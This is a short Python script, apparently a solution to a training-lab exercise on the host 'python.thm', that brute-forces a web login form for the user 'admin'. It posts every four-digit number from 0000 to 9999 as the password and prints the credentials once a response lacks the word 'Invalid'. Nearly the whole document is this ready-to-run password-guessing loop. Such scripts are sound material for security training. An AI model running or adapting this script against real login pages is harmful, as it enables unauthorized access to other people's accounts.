'''
Problem: brute force a web app login 
the username has been discovered to be 'admin'
the password is known to be a four digit number
'''

import requests
url = "http://python.thm/labs/lab1/index.php"
username = 'admin'

# Generate list of 4-digit numeric 'passwords'
password_list = [str(i).zfill(4) for i in range(10000)]

def brute_force():
    for password in password_list:
            data = {"username":username,"password":password} # note that data fields must match the name of the field on the target
            response = requests.post(url, data=data) # method must match the method required by the target

            if "Invalid" not in response.text:
                    print(f"[+] Found valid credentials: {username}:{password}")
                    break   
            else:
                    print(f"[-] Attempted: {password}")

if __name__ == '__main__':
    brute_force()